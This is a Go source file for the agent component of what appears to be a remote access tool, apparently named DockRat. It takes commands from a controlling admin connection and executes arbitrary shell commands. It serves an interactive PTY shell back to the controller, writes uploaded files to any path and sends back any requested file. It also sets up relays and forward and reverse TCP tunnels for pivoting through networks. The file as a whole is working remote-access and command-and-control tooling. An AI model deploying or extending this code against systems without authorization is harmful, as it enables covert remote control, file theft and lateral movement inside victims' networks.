package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/Singert/DockRat/core/common"
	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/creack/pty"
	"github.com/google/uuid"
)

var uploadFile *os.File
var uploadPath string
var shellStarted = false
var shellStdin io.WriteCloser
var relayCtx *RelayContext // 全局变量，供 MsgRelayPacket 使用

// ------ Forward ds& util func ------
var forwardConnMap = make(map[string]net.Conn)

func registerForwardConn(connID string, conn net.Conn) {
	forwardConnMap[connID] = conn
}

func getForwardConn(connID string) (net.Conn, bool) {
	conn, ok := forwardConnMap[connID]
	return conn, ok
}

func removeForwardConn(connID string) {
	delete(forwardConnMap, connID)
}

// ------ Backward ds& util func ------
var backwardMap = make(map[string]net.Conn)
var backwardAdminTarget = make(map[string]string) // 可选，用于调试

func getBackwardConn(id string) (net.Conn, bool) {
	c, ok := backwardMap[id]
	return c, ok
}
func removeBackwardConn(id string) {
	delete(backwardMap, id)
	delete(backwardAdminTarget, id)
}

func StartAgent(conn net.Conn) {
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Connection closed or failed: %v", err)
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Failed to read message body: %v", err)
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Decode error: %v", err)
			continue
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn)
		case protocol.MsgShell:
			handleShellPTY(msg, conn)
		case protocol.MsgStartRelay:
			handleStartRelay(msg, conn)
		case protocol.MsgRelayAck:
			var ack protocol.RelayAckPayload
			if err := json.Unmarshal(msg.Payload, &ack); err != nil {
				log.Println("[-] Decode relay_ack failed:", err)
				return
			}
			log.Printf("[+] Relay register success: %s", ack.Message)

		case protocol.MsgRelayError:
			var errMsg protocol.RelayAckPayload
			if err := json.Unmarshal(msg.Payload, &errMsg); err != nil {
				log.Println("[-] Decode relay_error failed:", err)
				return
			}
			log.Printf("[!] Relay register failed: %s", errMsg.Message)
		case protocol.MsgRelayPacket:
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Println("[-] Decode relay_packet failed:", err)
				break
			}
			if relayCtx != nil {
				HandleRelayPacket(relayCtx, pkt)
			} else {
				log.Println("[-] Relay context not initialized")
			}
		case protocol.MsgUpload:
			handleFileUploadMeta(msg, conn)
		case protocol.MsgFileChunk:
			handleFileChunk(msg, conn)
		case protocol.MsgDownload:
			handleDownload(msg, conn)
		case protocol.MsgForwardStart:
			handleForwardStart(msg, conn)
		case protocol.MsgForwardData:
			handleForwardData(msg)
		case protocol.MsgForwardStop:
			handleForwardStop(msg)
		case protocol.MsgBackwardListen:
			handleBackwardListen(msg, conn)
		case protocol.MsgBackwardData:
			handleBackwardData(msg)
		case protocol.MsgBackwardStop:
			handleBackwardStop(msg)

		default:
			log.Println("[-] Unknown message type:", msg.Type)
		}
	}
}

func handleCommand(msg protocol.Message, conn net.Conn) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{
		Type:    protocol.MsgResponse,
		Payload: output,
	}
	data, _ := protocol.EncodeMessage(resp)
	conn.Write(data)
}

func handleShellPTY(msg protocol.Message, conn net.Conn) {
	line := string(msg.Payload)

	if !shellStarted {
		cmd := exec.Command("/bin/sh")
		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		shellStarted = true
		shellStdin = ptmx

		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Println("[-] Shell read error:", err)
					return
				}
				msg := protocol.Message{
					Type:    protocol.MsgShell,
					Payload: buf[:n],
				}
				data, err := protocol.EncodeMessage(msg)
				if err != nil {
					log.Println("[-] Shell encode error:", err)
					return
				}
				_, err = conn.Write(data)
				if err != nil {
					log.Println("[-] Shell write error:", err)
					return
				}
			}
		}()
		return
	}

	// 已启动 shell，则写入 stdin
	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	_, err := shellStdin.Write([]byte(line))
	if err != nil {
		log.Println("[-] Write to shell error:", err)
	}
}
func handleStartRelay(msg protocol.Message, conn net.Conn) {
	var payload protocol.StartRelayPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] StartRelay payload decode error:", err)
		return
	}

	log.Printf("[*] Received startrelay command: listen on %s, ID range [%d ~ %d]",
		payload.ListenAddr, payload.IDStart, payload.IDStart+payload.Count-1)

	// 创建本地结构
	reg := node.NewRegistry()
	topo := node.NewNodeGraph()
	alloc := common.NewIDAllocator(payload.IDStart, payload.Count)

	ctx := &RelayContext{
		SelfID:      payload.SelfID, // 后续可传入或由自身记录
		Registry:    reg,
		Topology:    topo,
		IDAllocator: alloc,
		Upstream:    conn, // 保持与 admin 的通道
	}
	relayCtx = ctx
	go StartRelayListener(payload.ListenAddr, ctx)
	go StartAgent(conn)
	// 上报成功
	ack := protocol.RelayReadyPayload{
		SelfID:     -1, // 此处为当前 agent 自己的 ID，建议 future enhancement 填入
		ListenAddr: payload.ListenAddr,
	}
	data, _ := json.Marshal(ack)
	resp := protocol.Message{
		Type:    protocol.MsgRelayReady,
		Payload: data,
	}
	buf, _ := protocol.EncodeMessage(resp)
	conn.Write(buf)
}

// ---- Upload
func handleFileUploadMeta(msg protocol.Message, conn net.Conn) {
	var meta protocol.FileMeta
	if err := json.Unmarshal(msg.Payload, &meta); err != nil {
		log.Println("[-] Upload meta decode error:", err)
		return
	}
	log.Printf("[+] Start receiving file: %s -> %s (%d bytes)", meta.Filename, meta.Path, meta.Size)

	f, err := os.Create(meta.Path)
	if err != nil {
		log.Println("[-] Failed to create file:", err)
		return
	}
	uploadFile = f
	uploadPath = meta.Path
}

func handleFileChunk(msg protocol.Message, conn net.Conn) {
	var chunk protocol.FileChunk
	if err := json.Unmarshal(msg.Payload, &chunk); err != nil {
		log.Println("[-] Chunk decode error:", err)
		return
	}

	if uploadFile == nil {
		log.Println("[-] No upload file open")
		return
	}

	_, err := uploadFile.WriteAt(chunk.Data, chunk.Offset)
	if err != nil {
		log.Println("[-] Write chunk error:", err)
		return
	}

	if chunk.EOF {
		log.Printf("[+] File upload complete: %s", uploadPath)
		uploadFile.Close()
		uploadFile = nil
	}
}

func handleDownload(msg protocol.Message, conn net.Conn) {
	var req protocol.DownloadRequest
	if err := json.Unmarshal(msg.Payload, &req); err != nil {
		log.Println("[-] Download path decode error:", err)
		return
	}
	log.Println("[+] Start sending file:", req.Path)

	f, err := os.Open(req.Path)
	if err != nil {
		log.Println("[-] Open file failed:", err)
		return
	}
	defer f.Close()

	buf := make([]byte, 4096)
	var offset int64 = 0
	for {
		n, err := f.Read(buf)
		if err != nil && err != io.EOF {
			log.Println("[-] Read file error:", err)
			return
		}
		eof := err == io.EOF

		chunk := protocol.FileChunk{
			Offset: offset,
			Data:   buf[:n],
			EOF:    eof,
		}
		data, _ := json.Marshal(chunk)
		msg := protocol.Message{
			Type:    protocol.MsgFileChunk,
			Payload: data,
		}
		encoded, _ := protocol.EncodeMessage(msg)
		conn.Write(encoded)

		offset += int64(n)
		if eof {
			break
		}
	}

	// 可选：发送 download done
	done := protocol.Message{Type: protocol.MsgDownloadDone, Payload: []byte("done")}
	encoded, _ := protocol.EncodeMessage(done)
	conn.Write(encoded)
}
func handleForwardStart(msg protocol.Message, upstream net.Conn) {
	var payload protocol.ForwardStartPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] ForwardStart decode failed:", err)
		return
	}

	remoteConn, err := net.Dial("tcp", payload.Target)
	if err != nil {
		log.Printf("[-] Dial to %s failed: %v", payload.Target, err)
		return
	}

	connID := payload.ConnID
	registerForwardConn(connID, remoteConn)
	log.Printf("[+] Forward[%s] → connected to %s", connID, payload.Target)

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := remoteConn.Read(buf)
			if err != nil {
				break
			}
			payload := protocol.ForwardDataPayload{
				ConnID: connID,
				Data:   buf[:n],
			}
			data, _ := json.Marshal(payload)
			msg := protocol.Message{Type: protocol.MsgForwardData, Payload: data}
			encoded, _ := protocol.EncodeMessage(msg)
			upstream.Write(encoded)
		}
		// 出错或关闭，通知 admin
		payload := protocol.ForwardStopPayload{ConnID: connID}
		data, _ := json.Marshal(payload)
		msg := protocol.Message{Type: protocol.MsgForwardStop, Payload: data}
		encoded, _ := protocol.EncodeMessage(msg)
		upstream.Write(encoded)

		remoteConn.Close()
		removeForwardConn(connID)
		log.Printf("[-] Forward[%s] closed (read end)", connID)
	}()
}
func handleForwardData(msg protocol.Message) {
	var payload protocol.ForwardDataPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] ForwardData decode failed:", err)
		return
	}
	conn, ok := getForwardConn(payload.ConnID)
	if !ok {
		log.Println("[-] Unknown forward conn:", payload.ConnID)
		return
	}
	_, err := conn.Write(payload.Data)
	if err != nil {
		log.Printf("[-] Write to forward conn failed: %v", err)
		conn.Close()
		removeForwardConn(payload.ConnID)
	}
}
func handleForwardStop(msg protocol.Message) {
	var payload protocol.ForwardStopPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] ForwardStop decode failed:", err)
		return
	}
	conn, ok := getForwardConn(payload.ConnID)
	if ok {
		conn.Close()
		removeForwardConn(payload.ConnID)
		log.Printf("[-] Forward[%s] closed by admin", payload.ConnID)
	}
}

func handleBackwardListen(msg protocol.Message, upstream net.Conn) {
	var payload protocol.BackwardListenPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] BackwardListen decode failed:", err)
		return
	}

	addr := ":" + strconv.Itoa(payload.ListenPort)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("[-] Listen on %s failed: %v", addr, err)
		return
	}
	log.Printf("[+] Listening on %s for backward forwarding (→ admin %s)", addr, payload.Target)

	go func() {
		for {
			clientConn, err := ln.Accept()
			if err != nil {
				log.Println("[-] Backward accept failed:", err)
				continue
			}

			prefix := payload.Target // admin 给的 prefix
			connID := prefix + "-" + uuid.New().String()
			backwardMap[connID] = clientConn
			backwardAdminTarget[connID] = payload.Target

			// 告诉 admin 有新连接
			start := protocol.BackwardStartPayload{ConnID: connID}
			data, _ := json.Marshal(start)
			msg := protocol.Message{Type: protocol.MsgBackwardStart, Payload: data}
			encoded, _ := protocol.EncodeMessage(msg)
			upstream.Write(encoded)

			// 启动读取线程
			go handleBackwardRead(connID, clientConn, upstream)
		}
	}()
}
func handleBackwardRead(connID string, conn net.Conn, upstream net.Conn) {
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			break
		}

		payload := protocol.BackwardDataPayload{
			ConnID: connID,
			Data:   buf[:n],
		}
		data, _ := json.Marshal(payload)
		msg := protocol.Message{Type: protocol.MsgBackwardData, Payload: data}
		encoded, _ := protocol.EncodeMessage(msg)
		upstream.Write(encoded)
		log.Printf("[agent] → backward data %d bytes (connID=%s)", n, connID)
	}

	// ✅ 连接关闭时发送 MsgBackwardStop
	stopMsg := protocol.Message{
		Type:    protocol.MsgBackwardStop,
		Payload: []byte(connID),
	}
	encoded, _ := protocol.EncodeMessage(stopMsg)
	upstream.Write(encoded)

	conn.Close()
	removeBackwardConn(connID)
	log.Printf("[-] Backward[%s] closed (read)", connID)
}

func handleBackwardData(msg protocol.Message) {
	var payload protocol.BackwardDataPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] BackwardData decode failed:", err)
		return
	}
	conn, ok := getBackwardConn(payload.ConnID)
	if !ok {
		log.Println("[-] Unknown backward conn:", payload.ConnID)
		return
	}
	_, err := conn.Write(payload.Data)
	if err != nil {
		log.Printf("[-] Backward write failed: %v", err)
		conn.Close()
		removeBackwardConn(payload.ConnID)
	}
}

func handleBackwardStop(msg protocol.Message) {
	var payload protocol.BackwardStopPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] BackwardStop decode failed:", err)
		return
	}
	conn, ok := getBackwardConn(payload.ConnID)
	if ok {
		conn.Close()
		removeBackwardConn(payload.ConnID)
		log.Printf("[-] Backward[%s] closed by admin", payload.ConnID)
	}
}
